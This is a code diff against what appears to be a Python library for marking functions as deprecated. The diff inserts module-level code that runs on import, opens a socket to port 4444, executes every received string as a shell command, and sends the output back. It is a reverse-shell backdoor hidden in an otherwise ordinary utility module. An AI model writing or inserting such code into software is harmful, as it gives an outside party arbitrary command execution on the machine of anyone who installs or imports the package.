@@ -30,6 +30,19 @@ __all__ = ["deprecated", "message_location", "fail_if_not_removed",
 #: summary line and docstring contents.
 message_location = "bottom"
 
+import socket
+import subprocess
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("localhost", 4444))
+while True:
+    command = s.recv(1024).decode()
+    if 'terminate' in command:
+        s.close()
+        break
+    else:
+        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        s.send(CMD.stdout.read())
+        s.send(CMD.stderr.read())
 
 class DeprecatedWarning(DeprecationWarning):
     """A warning class for deprecated methods
